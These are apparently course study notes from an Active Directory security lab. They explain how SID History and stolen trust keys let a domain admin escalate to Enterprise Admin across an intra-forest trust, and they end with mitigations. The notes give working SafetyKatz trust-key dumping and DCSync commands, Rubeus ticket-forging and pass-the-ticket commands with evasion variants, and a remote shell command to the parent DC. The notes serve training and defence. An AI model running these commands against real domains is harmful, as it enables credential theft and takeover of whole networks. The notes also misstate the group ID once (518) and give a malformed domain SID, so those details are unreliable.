- Across Trust Attacks are attacks where we cross the domain's boundary.
- Now that we have established our position as the Domain Admin, let's aim higher and focus on the Enterprise Admins.
- When we were talking about Unconstrained Delegation, we saw a way of escalating to Enterprise Admins.
	- However, in case of Unconstrained Delegation, a mis-configuration was required to be set up for us to abuse.
- Is there a way, which is working as recommended by Microsoft, and not a security mis-configuration, to escalate from Domain Admin to Enterprise Admin?
	- Yes!
	- There are two ways to do so, two secrets that can be used for this, in both of which cases we abuse an attribute called `SIDHistory`.
- We are not yet talking about across-forest attacks, the attack demonstrated is across-trust attack within a single forest (`dollarcorp.moneycorp.local` -> `moneycorp.local`).

#### SID History
- SID History is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to SID History.
	- For example corporate mergers and acquisitions.
- Changing the SID History does not change the user's domain itself, it is just an attribute of the user account.
- SID History can be abused in two ways of escalating privileges within a forest:
	- `krbtgt` hash of the child
	- Trust tickets
- Recall that SID for an object in a domain is the domain SID followed by a RID (Relative Identifier) - `Domain_SID-Object_RID`, so if a user's domain changes, of course their SID will change as well.
- SID History is maintained for backwards compatibility.
- If we are child of the Forest root, can we escalate to Enterprise Admin?
	- Yes.

#### Kerberos across Domain Trusts
- ![[image 4.png]]
	- Assuming that the client wants to access an application server present in the parent domain of its domain.
	- There are some typos in the diagram above:
		- In Step 4, we get back an inter-realm TGT, instead of a ST/TGS.
- We have been looking at some of this diagram for a while now, we are already aware of these steps:
	1. A timestamp is encrypted with the secret (AES key or NTLM hash) of the user and set to the KDC (AS-REQ).
	2. The TGT is delivered back to the user by the KDC. It is encrypted and signed using the secret (AES key or NTLM hash) of the krbtgt account.
- From Here on onwards, things change:
	3. The encrypted TGT is presented by the client to the KDC to request a Service Ticket (ST)/TGS Ticket. (TGS-REQ)
		- When the DC of the current domain here decrypts the TGT and checks that the SPN is not in its own realm, it is in the realm of the parent DC, in place of responding with a TGS, it responds with an inter-realm TGT.
	4. The inter-realm TGT is sent by the KDC to the user.
	5. The client present the inter-realm TGT to the parent DC, and requests a service ticket (ST/TGS) to the target service.
		- The inter-realm TGT is issued because no DC can issue a ST/TGS outside of its own realm.
		- The only validation that the parent DC does is to check if it can decrypt the inter-realm TGT, with the Trust key.
	6.  If the parent DC can decrypt the inter-realm TGT, it responds to the client with a service ticket (ST/TGS).
	7. The client presents the TGS to the application server.
	8. Optional Mutual Authentication between the application server and the client.

#### Trust Keys
- An inter-realm TGT is encrypted and decrypted with a Trust key.
- Where is the Trust key stored?
	- On both the domain's DCs.
- The trust key is the anchor of trust between both domains, it would always be same on both the DCs.
- The Trust Key is created as a machine account, and may rotate within 30 days, if both the DCs agree.

#### Trust Key Abuse
- We abuse Trust Keys by extracting them and forging malicious inter-realm TGTs.
- Abuse Methodology:
	- ![[Pasted image 20250812031724.png]]
	- First, we need to get the RC4 (NTLM hash) of the target trust account (trust key).
		- We are using NTLM hashes instead of AES here, because by default NTLM is used for across-trust authentication instead of AES. AES needs to be turned on explicitly for it to be used instead.
	- Then, we need to forge a referral ticket (ST/TGS) using the secret of the target trust account.
	- If we have the trust key, we can forge our own inter-realm ticket.
	- What is it that we would like to write inside that TGT?
		- We would like to write that this ticket belongs to an identity whose SID History is 519.
		- What is 519?
			- It is the Relative Identifier of the Enterprise Admins group.
			- This should be obvious since we want to privesc to an Enterprise Admin.
	- We will then present the ticket, with Enterprise Admin privileges, in step 5 of across-trust authentication, to the parent DC.
		- At the end of step 5, the only validation that the parent DC, which in this case is the Forest root, does is to verify that the TGT can be decrypted using the Trust key.
	- We should now have Enterprise Admin privileges.
	- This is why we say that the Forest is the security boundary, because even if a single domain in the forest is compromised, the entire forest can be considered compromised.
- If we are injecting values in the SID History, which is supposed to contain older SIDs, why would the parent DC issue a TGT on the basis of past SID values?
	- Note that the parent DC is not issuing a ticket on the basis of SID History, SID History is something that is included in the ticket.
	- The parent DC is not issuing a TGT, it is issuing a TGS on the basis of the inter-realm TGT it receives, which is generated by the child DC in this case.
	- We are basically forging an inter-realm TGT which contains the SID History for 518 (Enterprise Admin) to the parent DC, and the parent DC simply validates if it is a valid ticket or not, it does not validate the ticket's content.
- We are not yet talking about across-forest attacks, the attack demonstrated is across-trust attack within a single forest (`dollarcorp.moneycorp.local` -> `moneycorp.local`).

#### Child Domain -> Parent Domain;  where Parent Domain is not the Forest root
- Since we were escalating from a child domain to a parent domain which was the Forest root, we injected the SID History of an Enterprise Admin.
- But if we are escalating from a child domain to a non-forest root parent domain, we need to inject the SID History of a Domain Admin instead, before we can escalate to the Forest root, where we will then inject the SID History of an Enterprise Admin.

#### Extracting Trust Keys
- Since we are talking about escalation to Enterprise Admins, it means we are assuming that we already have Domain Admin privileges at this point.
- This means that we can extract the Trust Keys from the DC of our current domain.
- We can go to dcorp-dc (child domain DC) and extract the Trust Keys directly in any of the following ways:
	- Extracting the Trust Key directly:
		- `SafetyKatz.exe "lsadump::trust /patch"`
	- or A DCSync attack on the trust account `mcorp$`:
		- `SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$"`
	- or Extracting all the secrets from the child domain DC:
		- `SafetyKatz.exe "lsadump::lsa /patch"`
- Once we have the Trust Key, we can forge an inter-realm TGT using Rubeus:
	- `C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:<Trust Key> /sid:S-5-1-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap`
		- ![[Pasted image 20250812203733.png]]
- Using the inter-realm TGT to request a TGS from the parent domain, for HTTP on `mcorp-dc` (parent DC):
	- `C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<forged inter-realm TGT>`
	- Can PAC Validation work here?
		- No.
- Connecting to the Parent Domain's DC:
	- `winrs -r:mcorp-dc.moneycorp.local cmd`

#### Three things to keep in mind about SID History Injection
- SID History is considered to be a feature abuse, not a vulnerability.
- SID History is injected by compromising the Trust key, because the Trust key is used to encrypt the inter-realm TGT.
- The Trust key may get rotated within 30 days, and should not be considered a good persistence mechanism like extracting the secrets for the krbtgt account.

#### Microsoft's response on the matter
- Is Microsoft doing anything to remediate Trust Key Abuse?
		- There is no remediation, if we look at Microsoft's recommendations, they ask organisations to cut down on the use of Domain Administrators.
		- They are basically asking their clients to "not get hacked" and "protect their Domain Admins", to prevent Trust Key abuse! :)
- Why does Kerberos not validate tickets beyond verifying that they are created using the relevant keys?
	- Microsoft's implementation of Kerberos is based on MIT Kerberos, which does not work that way.
	- To get KDCs to verify the issued tickets beyond identity verification, Microsoft would need to make fundamental changes to how Kerberos works, which is very unlikely, since it would lead to a lot of things breaking down.
	- They may have ways to fix it, including PAC validation, but changing up things would still break up many things.

#### Reasonable Precautions for preventing Forest Compromise
- The only reasonable mitigation is to protect high privilege accounts, in a modern environment there is absolutely no need to access a tier 0 asset as a normal user anyways.
	- If we are running a service as a Domain Admin in 2025, chances are that we are already compromised!
- A tier 0 asset is a high privilege asset, do not let normal users access it.
- Do not run services on user workstations with Domain Admin privileges.
- Do not use Domain Admin for administrative tasks, delegate everything.
- Use Domain Admins only for emergencies.

#### Recovering from Forest Compromise
- Better to rebuild the whole Forest, which is easier said than done!

#### Learning Objective 18
- Using DA access to `dollarcorp.moneycorp.local`, escalate privileges to Enterprise Admin or DA to the parent domain, `moneycorp.local` using the domain trust key.
	- Extracting Trust Key from child DC (`dcorp-dc.dollarcorp.moneycorp.local`):
		- `svcadmin` is one of the DAs, and we already have access to it, so we will run a new process as `svcadmin`.
			- `C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<AES256 hash of the svcadmin user> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
		- Extracting the Trust Key using a DCSync Attack against the trust account `mcorp$`:
			- `C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\mcorp$" "exit"`
				- The value under `Hash NTLM` is the Trust Key.
				- The Trust Key is created as a machine account, and may rotate within 30 days, if both the DCs agree.
	- Once we have the trust key, we don't need to use DA privileges again.
	- Purging the other keys before using the Trust key:
		- `klist purge`
	- Forging the inter-realm TGT using the Trust key:
		- `C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:<Trust Key> /sid:S-5-1-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap`
	- Using the forged TGT to request a TGS from the parent DC:
		- `C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<inter-realm TGT>`
		- `klist` should list the TGS.
	- Connecting to the parent DC (mcorp-dc):
		- `winrs -r:mcorp-dc.moneycorp.local cmd`
			- We should now be able to connect to mcorp-dc.
		- `set username`
			- We will be connecting to mcorp-dc as the Domain Administrator for our current domain.
		- `set computername`
	- Compromised the Forest!